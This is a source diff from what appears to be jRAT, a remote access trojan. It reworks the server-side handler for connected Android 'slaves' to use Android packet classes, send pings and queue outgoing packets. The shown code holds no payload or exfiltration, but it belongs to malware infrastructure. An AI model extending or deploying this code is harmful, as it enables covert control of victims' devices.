@@ -16,12 +16,12 @@ import su.jrat.client.crypto.GlobalKeyPair;
 import su.jrat.client.exceptions.CloseException;
 import su.jrat.client.net.ConnectionHandler;
 import su.jrat.client.net.PortListener;
-import su.jrat.client.packets.incoming.IncomingPackets;
+import su.jrat.client.packets.android.incoming.IncomingAndroidPackets;
+import su.jrat.client.packets.android.outgoing.AbstractOutgoingAndroidPacket;
+import su.jrat.client.packets.android.outgoing.AndroidPacket0Ping;
 import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
-import su.jrat.client.ui.frames.Frame;
 import su.jrat.client.ui.panels.PanelMainLog;
 import su.jrat.client.utils.TrayIconUtils;
-import su.jrat.client.utils.Utils;
 import su.jrat.common.codec.Hex;
 import su.jrat.common.crypto.Crypto;
 import su.jrat.common.crypto.KeyExchanger;
@@ -87,7 +87,7 @@ public class AndroidSlave extends AbstractSlave {
 					continue;
 				}
 
-				IncomingPackets.execute(header, this);
+				IncomingAndroidPackets.execute(header, this);
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
@@ -109,14 +109,40 @@ public class AndroidSlave extends AbstractSlave {
 		}
 	}
 
-	@Override
-	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
+	public void sendPacket(AbstractOutgoingAndroidPacket packet, DataOutputStream dos) throws Exception {
 		packet.send(this, dos);
 	}
 
 	@Override
 	public void ping() throws Exception {
-		// TODO addToSendQueue(new AndroidPacket0Ping());
+		addToSendQueue(new AndroidPacket0Ping());
+	}
+
+	@Override
+	public String getDisplayName() {
+		// TODO Auto-generated method stub
+		return null;
+	}
+	
+	public synchronized void addToSendQueue(AbstractOutgoingAndroidPacket packet) {
+		while (lock) {
+			try {
+				Thread.sleep(10L);
+			} catch (Exception ex) {
+				ex.printStackTrace();
+			}
+
+		}
+		try {
+			sendPacket(packet, dos);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+
+	@Override
+	public void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception {
+		throw new Exception("No packet found");
 	}
 
 }
